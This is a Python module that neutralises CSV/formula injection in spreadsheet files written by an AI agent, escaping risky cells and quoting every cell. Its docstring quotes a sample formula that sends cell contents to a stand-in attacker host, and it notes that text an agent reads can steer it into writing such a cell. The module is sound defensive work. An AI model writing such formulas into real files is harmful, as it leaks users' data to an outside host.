"""CSV artifacts, made safe to open in a spreadsheet.

What an agent read can steer it into writing a cell such as
``=HYPERLINK("evil.example/?"&A1,"Open")``: Excel and LibreOffice run a
cell that starts with ``=``, ``+``, ``-`` or ``@`` as a formula (CSV injection),
and a leading tab or carriage return can hide that start. Such a cell gets a
leading apostrophe, which spreadsheets show as text; a plain number such as
``-12.5`` keeps its sign.

A spreadsheet splits a file on its locale's delimiter (a comma, or a semicolon in
much of Europe), not necessarily the one the agent used, so a cell is also checked
piece by piece, and a rewritten file quotes every cell: no delimiter can then cut
a formula out of one. A file with nothing to neutralise is saved as written.
"""

from __future__ import annotations

import csv
import re
from io import StringIO

from api.services.artifacts.contracts import RenderOptions

#: What a spreadsheet may take for the start of a formula.
_FORMULA_STARTS = ("=", "+", "-", "@", "\t", "\r")
#: A plain signed number, which a spreadsheet reads as that number: -12.5, +3, -1e6.
_NUMBER = re.compile(r"[+-]?(?:\d+(?:[.,]\d*)?|[.,]\d+)(?:[eE][+-]?\d+)?")
#: Delimiters a spreadsheet may split on, whichever the agent meant.
_DELIMITERS = ",;\t|"
_ANY_DELIMITER = re.compile(r"[,;\t|]")
_SNIFF_CHARS = 8192


def render_csv(content: str, options: RenderOptions) -> bytes:
    delimiter = _delimiter(content)
    rows = list(csv.reader(StringIO(content, newline=""), delimiter=delimiter))
    if not any(_risky(cell) for row in rows for cell in row):
        return content.encode("utf-8")
    out = StringIO(newline="")
    writer = csv.writer(out, delimiter=delimiter, lineterminator="\n", quoting=csv.QUOTE_ALL)
    writer.writerows([[_as_text(cell) for cell in row] for row in rows])
    return out.getvalue().encode("utf-8")


def _delimiter(content: str) -> str:
    """The delimiter the agent used; a comma when the start of the file does not tell."""
    try:
        return csv.Sniffer().sniff(content[:_SNIFF_CHARS], delimiters=_DELIMITERS).delimiter
    except csv.Error:
        return ","


def _formula(text: str) -> bool:
    return text.startswith(_FORMULA_STARTS) and not _NUMBER.fullmatch(text)


def _risky(cell: str) -> bool:
    """Whether a spreadsheet may run the cell, or a piece of it that splitting on
    another delimiter would make a cell of its own."""
    return _formula(cell) or any(_formula(piece) for piece in _ANY_DELIMITER.split(cell))


def _as_text(cell: str) -> str:
    return f"'{cell}" if _formula(cell) else cell
